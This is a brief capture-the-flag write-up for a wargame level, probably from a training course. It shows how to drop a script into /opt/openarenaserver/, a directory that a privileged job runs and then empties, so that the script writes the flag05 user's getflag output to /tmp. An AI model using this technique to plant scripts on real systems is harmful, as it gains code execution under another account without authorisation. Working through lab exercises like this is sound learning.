# Level05
## Description
The level 05 user has receive "a mail" so we found **`/var/mail/level05`**,  which execute a script as flag05.
The script execute every bash files in `/opt/openarenaserver/*` and suppress it.

## Solution
- We need to create a bash script which will execute `getflag` and put the result somewhere else.

```bash
cat script.sh
#!/bin/sh
/bin/getflag > /tmp/flag05
```

- We wait few second with `script.sh` in `/opt/openarenaserver/`

- After the deletion of script.sh, the flag is write in `/tmp/flag05`.
